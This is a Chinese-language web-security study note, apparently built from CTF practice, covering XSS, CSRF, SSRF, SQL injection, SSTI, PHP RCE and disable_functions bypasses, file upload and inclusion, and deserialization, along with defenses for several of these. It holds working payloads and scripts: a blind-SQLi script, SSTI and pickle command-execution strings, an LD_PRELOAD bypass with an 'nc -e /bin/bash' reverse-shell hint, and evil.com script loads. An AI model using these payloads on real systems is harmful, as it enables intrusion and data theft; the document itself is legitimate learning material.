# 前言：后面很多绕过太过于细节，本不该花费时间。整理出来只是为了知识的完整性。重要点是渗透测试知识点整理

# XSS

## 概述

XSS全称Cross-Site-Scripting，也就是跨站脚本攻击。因为**同源策略**，javascript代码无法直接读取用户在正常网站中的信息，于是想出了**注入js代码**的方法，把恶意代码注入到正常网站中，也就不存在同源的概念了。

所以可以说XSS的本质就是代码注入，而几乎所有的代码注入都是手动拼接字符串导致的。服务端将客户端传入的输入中的恶意js代码直接用于拼接构造html页面返回，浏览器认为这段恶意js代码就是服务器给的，于是执行。

正常给XSS分为三类：

1. 反射型XSS：最常见，服务端把url中的参数直接用于构造html页面返回
2. 存储型XSS：常见于评论，服务端把评论存储在数据库中，然后拿出来直接拼接html页面并返回
3. DOM型XSS：和前两个都不一样，前两个都是服务端拼接恶意js代码到html中，这个是在前端js代码动态执行的时候才引入恶意代码。主要是利用`.innnerHTML`

## 攻击

XSS的最常见的攻击就是窃取cookie，但是HttpOnly属性的普及让窃取cookie不再如以前一样简单。本质上XSS利用成功的后果就是执行任意js代码，所以js代码能做什么攻击者就可以做什么，比如发起GET或者POST请求，或者获取浏览器扩展，计算机信息等等。注意XSS是绕过了同源策略，因此和CSRF不同，恶意网站是可以获取相应的，在js代码中把响应发送到恶意网站即可。

更常用的XSS平台，集成了许多XSS攻击可以实现的功能。比较有名的是BeEF，和清华大学蓝莲花战队的BlueLotus。

## 绕过

姿势很多，主要有

1. 大小写，双写，编码，填充空白字符等
2. 利用`javascript://`伪协议
3. 闭合html标签，使用src属性加载js代码
4. 事件处理程序比如onfocus

直接可以大致分为两类：

1. 内联js代码：比如`onfocus=“alert(1);”`，`href=javascript://alert(1)`
2. 加载外部js代码，如`src=http://evil.com/evil.js`

主流就是加载外部js代码，因为XSS攻击的payload一般较长，写在js文件中部署到自己的恶意服务器上，再远程加载方便很多。

这里又想到了同源策略，同源策略没有限制跨域加载js代码，因此我们可以实现攻击。

## 防御

### HTTPOnly

这个一般默认开启，是最基础的，不再赘述

### 输入过滤

这是早期对抗XSS的不标准的做法。主要就是过滤一些XSS攻击会用到的特殊字符，比如`< >`，正常用户很少会用到它们。早期IE浏览器的XSS Filter和chrome的XSS Auditor，就是检测请求中的恶意参数有没有出现在HTTP响应中，如果出现，就认为这可能是XSS攻击。它们都存在一些问题，比如从实现机制上看只能防御反射型XSS，因为是只检查**url**；其次过滤本质是**黑名单**，可能会被绕过，尤其是在服务端的处理不规范的时候。

输入过滤本身也存在问题，特殊字符用户并不是完全用不到。比如在技术论坛中这种**富文本**环境下，用户本来就要评论一段js代码，直接**粗暴过滤**就会破坏代码结构。

### 输出转义

输入不行就看输出。输出转义是业内普遍采用的方法，也就是标准XSS防御方案。根据要输出的环境进行响应的转义，输出到html中就html转义，输出到js代码中就执行js转义。注意在如事件处理程序这种嵌套环境中。要先做js代码转义，再做html转义。（因为前端先解析html，然后解析再js代码）

输出转义在传统的MVC中很容易在View层实现，主要就是利用模板引擎（比如python的jinja2）内置的很多过滤器

但是在富文本场景下，输出转义也是不可取的。进行转义也是会破坏代码结构，比如这样一句话`这是一个<a href="https://example.com">链接</a>。`,经过输出转义就变成了`这是一个&lt;a href=&quot;https://example.com&quot;&gt;链接&lt;/a&gt;。`因此富文本场景还是只能回到输入过滤，但是不能粗暴过滤特殊字符，而是过滤危险标签，禁止事件这种动态效果等等。注意应该尽量使用白名单。

### 对于DOM型XSS

这个比较特殊，因为此时恶意js代码是在前端的js代码执行过程修改了DOM而引入的，本质是前端构造了不安全的代码。防御主要是前端避免直接操作innerHTML,使用现代js框架提供的安全的方法操作DOM

### CSP

最安全但是难以实施的方案

全称Content-Security-Policy  内容安全策略，首先完全禁止内联js代码，其次由服务端发送Content-Security-Policy消息头指明可以加载js代码的域。这和CORS很像，实际上就可以看作对CORS策略的补丁，因为CORS没有限制跨域加载js代码。但是缺点太明显，完全禁止内联的js代码导致所有js代码都要从外部加载，而当今外部资源十分复杂，管理很困难，维护成本高。那些已有的web应用想改造更是不太可能，难道要删除所有已有的内联js代码然后重写一遍？

# CSRF

一句话概括：在用户**不知情**的情况下，诱使用户向正常网站的服务器发出带有**副作用**的请求。

我们大致将CSRF分为两类：

1. 请求是第三方网站发出的，也就是攻击者自己的恶意网站，那么需要带上用户正常网站的cookie才能正常请求。这是涉及到第三方cookie的场景，可以使用cookie的SameSite属性缓解。
2. 正常网站本身存在CSRF漏洞，在当前网站就可以直接发出请求。此时并没有跨站点，也没有第三方cookie，但是也叫CSRF，因此核心还是**用户不知情的情况下发出的有副作用的请求**。

## 验证码

针对第一个关键词：不知情。既然是不知情发出，就强制用户使用验证码交互之后才能发出请求。但是出于用户体验的考虑，不能哪里都加上验证码，因此验证码只能作为防御CSRF的辅助手段。

## Referer校验

因为请求是恶意网站发出的，因此可以校验Referer的值是否来自正常网站，不是就有可能是CSRF攻击。

这里有一个前提，Referer值是无法通过javascript修改的。`Referer`头是由浏览器自动生成和添加的，它在HTTP协议层面实现，优先于页面中的JavaScript执行。

这个方案的缺点在于，有时浏览器不会发送Referer头，比如一些隐私保护扩展会阻止发送Referer，比如**HTTPS跳转到HTTP**时，就不会发送Referer。还有一个问题是业务场景的复杂导致Referer校验逻辑复杂，无法完全避免绕过。比如上面的第二类，Referer值就是网站自己，因为请求是网站内部发出的。

国内很多互联网大厂曾采用Referer校验作为防御CSRF的方案，其中出现过很多绕过的案例。因此这个方案可以作为辅助，监控CSRF的发生，但不能作为主要方案来依赖。

## Cookie的SameSite属性

因为在CSRF的第一类攻击中，需要第三方cookie才能成功，因此Cookie的SameSite属性为Strict时可以阻止攻击。

但是Strict会完全阻止第三方cookie，这会大幅影响用户体验。如果设置为LAX，导航跳转和GET请求表单都会携带cookie，此时如果应用的重要操作时GET进行的，那还是存在CSRF漏洞。

同时即使设置为Strict还是阻止不了第二类由站内发情的申请，因此这个方案也只能作为缓解，不能依赖

## Anti-CSRF Token

这才是业内**标准的做法**

CSRF能执行的重要一点就是攻击者可以预测到完整的url，从而伪造一个请求。因此我们给url引入一个随机的Token值。因为是随机的，**不可预测**的，因此攻击者无法构造出一个带合法Token的url来请求。

但是Anti-CSRF Token仅仅只能用来防御CSRF，假如这个网站同时存在XSS，那么攻击者就可以通过XSS读取这个Token值，防御也就无效了。不过这严格来说算XSS攻击。

# SSRF

## 概述

一句话概括成因：攻击者可以让服务端访问指定的url，目标**通常**是没有授权认证机制的内网应用。

比如web应用在前端页面上放一个输入框，获取用户要访问的url，然后访问。本意可能是拍摄其他网站的快照，但是没有对url进行校验导致可以访问内网应用。

**SSRF**漏洞利用的表现形式很像**文件包含漏洞**。远程文件包含漏洞可以算作SSRF漏洞，因为是让服务端访问了意料外的url。（比如遇到的通过远程文件包含访问攻击机器的smb服务捕获NTLM哈希）而SSRF漏洞也能通过file://协议访问本机文件，达到和本地文件包含漏洞一样的效果。

有时候SSRF没有回显，我们可以用与SQL盲注的带外数据注入一样的方式进行“SSRF盲打”，原理就是利用DNS服务器日志进行记录，网上也很多现成的DNSlog平台。（注意这是用来探测漏洞是否存在）

SSRF漏洞的定义很广泛，只要是服务端发出了意料之外的请求都算，因此有很多**触发途径**：

1. 最简单的把输入的url拿来直接访问
2. 通过解析存在XXE漏洞的XML文件触发请求
3. 服务端对如邮件系统的**网址安全检测功能**的内容检测引擎为了检验url的安全性，也会先访问触发SSRF
4. log4jshell是不是也算？log4jshell一般是指Log4j2解析含有有jndi请求如`${jndi:ldap://evil.com/a}`的日志，解析到了jndi语法直接执行，出发了jndi请求。我们一般归类为JNDI注入，但是从它的最终的表现形式来看，完全符合“服务端请求伪装”。

## 利用

1. 端口扫描，通过对不同IP，端口的请求的反应时间不同判断主机存活情况以及端口开放状态。这属于侧信道攻击。
2. 利用协议访问非Web应用

第二点是SSRF攻击的重点。比如简单的file协议访问本地文件。危害最大的就是通过DICT，Gopher，LDAP等协议达到协议走私效果，以Gopher为例：
**`gopher://<host>:<port>/<gophertype><selector>`**

最后`<selector>`的内容会被直接发送给服务器，比如可以在这部分放一个HTTP数据包，或者redis的指令。

注意Gopher协议最理想夹带建立TCP链接后立马就能用，无需额外握手的协议以及无需握手的服务。前者如HTTP，后者如Redis。像TLS就无法使用Gopher完成握手，就不可能实施攻击。

Redis算是大头，因为它默认没有身份认证，随便访问。可以篡改敏感数据，或者存恶意数据通过SAVE指令写入文件，从而写入ssh公钥啊，写入webshell啊等等。

## 防御

SSRF没有固定防御方案，主要依赖白名单URL，以及加强内网应用的授权认证机制（**零信任模型**）

注意黑名单比较容易绕过，比如把**内网域名**作为黑名单，可以通过能解析到任意IP地址的泛域名，通过伪造域名修改DNS记录等方式绕过。把**内网IP**作为黑名单也存在很多绕过方法，不再赘述。

# SQL注入

主要以my_sql举例，偏向CTF题目类型。

## 注释

首先是SQL注入的注释，这是SQL注入的关键之一。

`-- `是SQL语法中的单行注释，在所有数据库系统都适用

`#`是Mysql独有的单行注释符，只能用于Mysql

`/* */`是SQL语法的多行注释 ，常用于绕过**过滤空格**

## 函数

- group_concat()
- database()
- mid()    ascii()    substr()    时间盲注
- updatexml()     extractvalue()   报错注入
- LOAD_FILE() 读文件

## 分类

大致区分为两类：**有回显**和**无回显**（盲注）

1. union注入：首先通过`order by`穷举查询列数，或者`union select 1,2,3....`查询列数（常见于过滤or）。然后确定回显列，然后插入**函数**获取信息。
   然后就是通过information_schema查表，列，最后select查询
2. 堆叠注入：类似命令执行，通过`;`结束上一句SQL语句，然后写新的语句。Mysql中主要靠`show`
3. 报错注入：常用有 `updatexml(1, concat(0x7e,database()), 1)`和`extractvalue(1,concat(0x7e,database()))`主要就是参数不同
4. 布尔盲注：通过页面返回是否变化判断SQL语句是否被执行
5. 延时注入：就是时间盲注，利用`benchmark()`函数多次执行另一个函数比如`md5()`，通过耗时的长短判断语句是否执行
6. 带外数据注入：构造特定的SQL语句向外发送数据，判断sql语句是否执行成功。主要是发起DNS查询，监控DNS日志（使用dnslog平台）
7. 二次注入：提交的恶意数据存在数据库后，应用程序再次读取出来生成新的SQL语句时发生注入。

一个典型的布尔盲注脚本：

```
import  requests
url = "http://eba63dae-3cf2-4f30-8b24-2d0e21aca58a.node5.buuoj.cn:81/image.php?id=\\0&path="
payload = " or ascii(substr((select password from users),{},1))>{}%23"
result = ''
for i in range(1,100):
    high = 127
    low = 32
    mid = (low+high) // 2
    # print(mid)
    while(high>low):
        r = requests.get(url + payload.format(i,mid))
       # print(url + payload.format(i,mid))
        if 'JFIF' in r.text:
            low = mid + 1
        else:
            high = mid
        mid = (low + high) // 2
    result += chr(mid)
    print(result)
```

## 绕过技巧

一般先通过fuzz工具确定过滤什么，我一般都是burpsuite的爆破模块跑一边字典。

1. 空格被过滤，用`()`或者`/**/`

2. 关键字被过滤：双写，大小写等

3. information_schema被过滤：使用`sys.schema_auto_increment_columns`或者`mysql.innodb_table_stats`

4. 无列名注入：`select b from (select 1,2,3 as b union select * from admin)a;`或者```select `3` from (select 1,2,3 union select * from admin)a;```(`被禁用就用前者)

5. 堆叠注入handler：mysql中select被禁用时，可以使用更加底层的handler。这是mysql特有的语句，用法：
   ``````
   handler table_name open;
   handler read first;
   handler read next;
   ...
   ``````

6. 宽字符注入：数据库用GBK编码，web应用不是。`0x bf 27`，web应用理解时两个字符`0xbf 0x27`，而`0x27`是单引号，需要转义。于是就变成了`0x bf 5c 27`。`0xbf5c`又被数据库以GBK编码理解为一个字符了，最后的单引号`0x27`就逃逸出来了，闭合原来的SQL语句。

7. 异或注入   '-0-'  原理都是最后等号右边是个0，因此等式是`where username = 0`。而mysql中字符串和数字比较时，会尝试把字符串转为数字。一旦字符串开头不是数字，就直接转为0。因此上面的等式绝大部分情况下成立。

## 攻击利用

注入成功后具体要做什么？最简单直接就是读数据，读取敏感数据。

还有

1. into outfile/dumpfile  写文件，可以导出一个webshell
2. 利用UDF（用户自定义函数）直接执行命令。Mysql中在允许堆叠注入或者into dumpfile写文件时可以写入UDF动态链接库，然后创建自定义函数执行UDF中代码。比如`lib_mysqludf_sys`
3. 攻击存储过程。主要是MS SQL中的xp_cmdshell，可以直接执行系统命令。一般需要管理员命令开启。 

## 防御

最标准的做法：使用预编译语句，绑定参数查询。

将SQL语句的结构固定下来，仅填充可变的部分，避免SQL语句被拼接。通过预编译语句查询的方法也叫参数化查询。预编译语句可以理解为SQL模板，变量用`?`当作占位符

其他：

使用安全的存储过程。存储过程和预编译语句的区别就是要先存在数据库中，使用的时候传递参数给数据库就能使用。但也要避免动态拼接SQL语句

参数校验。检查输入数据的数据类型。

# XXE注入（XML外部实体注入）

```
<?xml version = "1.0"?>
<DOCTYPE foo [
<!ENTITY test SYSTEM "file:///etc/passwd">#发起SSRF攻击
]>
<foo>&test;</foo>
```

# SSTI（服务端模板注入）

## python的jinja2

漏洞成因：使用了不安全的`render_template_string()`函数动态拼接字符串到html中

核心：利用`os`模块的`popen()`命令执行

先看`{{config}}`确定是jinja2，如果被过滤，就：

```
{{ url_for.__globals__['current_app'].config }}
```

url_for是基本都会提前加载好的，因此可以：

```
{{ url_for.__globals__['os'].popen('cat /flag').read() }}
```

最常规最通用，是通过空列表，元组或字符串溯源到祖宗Object类，然后找它的子类`warnings.catch_warnings`然后找`__init__['globals'].__builtins__`。`__builtins__`中包含了 Python 的所有**内置函数和异常**。接下来最常用就是利用`__import__`导入`os`模块，利用`os.popen`执行命令了，因此一个标准的payload可能如下：

```
?search={{().__class__.__bases__[0].__subclasses__()[59].__init__['__glo'+'bals__'].__builtins__['__import__']('os').popen('cat /etc/passwd').read()}}
```

如果关键字被过滤就可以如上进行拼接

还有各种绕过就不写，记不住，具体可以看之前总结的payload

## python的tornado

找`{{handler.settings}}`

## PHP的smarty

```
{$smarty.version}
{system('cat index.php')} 
```

## PHP的TWIG

```
{{['cat /etc/passwd']|filter('system')}}

{{'/etc/passwd'|file_excerpt(1,30)}}

{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("whoami")}}
```

# 远程代码执行

包含两块，php代码层面的绕过，和系统命令方面的绕过

## 一：php中一些函数

有反引号，system  exec  passthru   shell_exec等等，这些都是直接执行系统命令。

关键：`assert()`和`eval()`  直接执行php代码，代码中自然可以再调用上面的函数执行系统命令

## 二：重点，Disable_Functions绕过

phpinfo中可以查看Disable_Functions,也就是被禁用的函数。当几乎所有能执行的函数被禁用之后，我们就要使用特殊的绕过方法：

LD_PRELOAD绕过：

LD_PRELOAD是Unix系统中的环境变量，用于**在程序运行时优先加载指定的共享库（`.so` 文件）**，从而可以**覆盖或修改**程序原本调用的标准库函数。这个利用的前提是可以使用蚁剑连接

先用蚁剑上传一个.php，内容如下：

```
<?php
putenv("LD_PRELOAD=./demo.so");
mail('','','','');
?>
#mail()执行过程中一定会调用geteuid()
```

.so文件如下：

```
#include <stdlib.h>
#include <stdio.h>
#include <string.h>

void payload(){
	system("cat /flag > /tmp/flag");#也可以直接nc反弹shell    nc xxxx  -e /bin/bash
}
int geteuid(){
	unsetenv("LD_PRELOAD");#最好写不然有时候会报错
	payload();
}
```

当然也不用手操，蚁剑的插件的辅助工具类中就有`disable_function绕过`插件，直接使用即可

## 三：系统命令连接符

| ;            | &                                            | \|                                       | &&                                     | \|\|                                   |
| :----------- | -------------------------------------------- | ---------------------------------------- | -------------------------------------- | -------------------------------------- |
| 顺序执行命令 | 需要url编码为%26，前面一个命令在**后台**执行 | 管道符，前面命令的结果作为后面命令的参数 | 前一个命令执行**成功**才执行后一个命令 | 前一个命令执行**失败**才执行后一个命令 |

## 四：空格过滤绕过

1. 重定向字符<>```cat /flag   cat</flag   cat<>/flag```
2. 大括号```{cat,/flag}```
3. 使用$IFS代替；$IFS ${IFS}  $IFS$9                 ```ls$IFS-l```        防止后面的内容被当作变量名使用${IFS}或者$IFS$9，$9是当前系统shell进程第九个命令行参数，一般为空。（到10就要${10}）
4. url编码	%09(Tab)   %20(space)            (基本没用)

## 五：过滤cat

使用`tac more less tail od xxd`等其他指令读取文件

## 六：编码绕过

```
`echo Y2F0IC9mbGFnLnBocA== | base64 -d | bash`
```

## 七：重点，无参数RCE

1. HTTP请求头    使用`?code=eval(pos(getallheaders()))`，在请求头中写system()。(getallheaders()是反序)

2. 利用全局变量RCE:
   ```
   eval(end(pos(get_defined_vars())));&cmd=system('ls');
   ```

3. session  RCE
   ```
   ?code=eval(hex2bin(session_id(session_start())))
   ```

4. 使用scandir()进行文件读取
   ```
   ?code=print_r(scandir(current(localeconv())))
   ?code=print_r(end(scandir(getcwd())));
   #用dirname向上，然后scandir列出，最后show_source	highlight_file	readfile()读取
   ```

## 八：无字母数字绕过

1. 异或运算绕过
2. 取反绕过
3. 自增绕过
4. 特殊符号过滤

# 文件操作

file_get_contents绕过

`file_get_contents($_GET['2333']) === 'todat is a happy day'`。`file_get_contents`的参数本来是要读的文件路径，这里有两种方法直接传入目标字符串：

1. 使用data://协议
2. 使用php://input，数据部分写入字符串

## 文件上传

1. 路径解析漏洞：依赖于低服务器版本，比如php<5.3.1的%00截断，IIS的；截断，点`.`和空格组合截断等等。
2. 前端js绕过    MIME类型（Content-Type）绕过
3. 文件头绕过
4. 允许上传`.htaccess`文件，指定jpg后缀当php文件执行
5. 压缩包解析时的空字符截断
6. 有时候文件名会被记录到日志中，把webshell写在文件名中
7. 其他各种字符层面的绕过，主要针对黑名单，比如php被过滤就用短标签

上传的最终目的就是一个webshell反弹拿到shell环境

防御：

1. 使用**白名单**严格校验**后缀名**
2. 上传文件的文件名或者目录使用基于时间戳的随机数，避免被遍历访问到
3. 上传目录不给执行权限
4. 分离存储，存在专门的文件服务上，而不是web服务器上
5. 对图片二次渲染，消除隐藏的恶意代码；对压缩文件在安全的沙箱环境中解压并检查其中的每一个文件。

## 文件包含

路径穿越漏洞：利用本地文件包含../../../../直接读取到/etc/passwd了

远程文件包含：直接触发访问smb服务（responder抓取NTLM哈希）

本地文件包含：file://读本地文件

最重要的php://filter读php文件

因为php文件直接`include`是嵌入执行，我们利用`php://filter/convert.base64-encode/resouce=`进行base64编码，防止php代码被执行。

# php反序列化

依赖魔术方法，主要看字符串逃逸那块

# python反序列化

就是pickle反序列化，直接看pickle那一章

一个标准`__reduce_`利用:

```
import pickle
import urllib

class payload(object):
    def __reduce__(self):
       return (eval, ("open('/flag.txt','r').read()",))

a = pickle.dumps(payload())
a = urllib.quote(a)
print a

c__builtin__%0Aeval%0Ap0%0A%28S%22open%28%27/flag.txt%27%2C%27r%27%29.read%28%29%22%0Ap1%0Atp2%0ARp3%0A.
```

## 正则绕过

正则表达式的结构是`^.*(黑名单).*$`

^匹配开头，$匹配结尾，`.*`贪婪匹配

- 对于`^....$`形式的正则，可以用%0a绕过法。

  原理是没有设置多行模式，即修饰符`m`,那么`^`只会匹配第一行内容。也没有修饰符`s`,`.*`不会匹配换行符%0a

  **因为不能匹配到完整的字符串返回FALSE而绕过。**

  可用payload如下：

  ```
  ?cmd={%0a"cmd":"/bin/cat /home/rceservice/flag"%0a}
  #第一个.*匹配{，然后第一个%0a由黑名单捕获，但是最后的 .* 不能匹配换行符,因此也匹配不到换行后的 }所以不能匹配到完整字符串,返回值为空,完成正则绕过
  ?cmd=%0a{%0a"cmd":"/bin/cat /home/rceservice/flag"}
  ?cmd=%0a{"cmd":"/bin/cat /home/rceservice/flag"%0a}
  ?cmd=%0a{"cmd":"/bin/cat /home/rceservice/flag"}%0a%0a
  #这里要两个%0a是因为单行模式$默认你最后的%0a之前的内容才是要传输的内容
  ```

- 对于有贪婪匹配的，可以利用超回溯次数的方法。

  php的正则引擎就是回溯引擎。简单来说就是遇到贪婪匹配的量词时候会一直匹配到结尾，然后再不断往前进行回溯。为了防止无限回溯被DDOS攻击，一般会设置回溯次数上限比如100万次，超出就立马返回FALSE

# SHTML

> **SHTML** 是一种特殊的 HTML 扩展，允许在网页中嵌入服务器端指令（SSI），以实现动态内容生成和页面的重复使用

所以重点是可以写入SSI(Server Side Includes)指令。其语法如下

```
<!--#exec cmd="ls" -->
<!--#exec cgi="/cgi-bin/access_log.cgi"-->
<!--#echo var="DOCUMENT_URI" -->
<!--#include virtual="/includes/header.html" -->   包含一个相对于网站根目录的虚拟路径的文件
<!--#include file="footer.html" -->                包含一个相对于当前目录的物理路径的文件
```

最重要就是include和exec。exec最为简单，直接写入要执行的系统命令就可以了。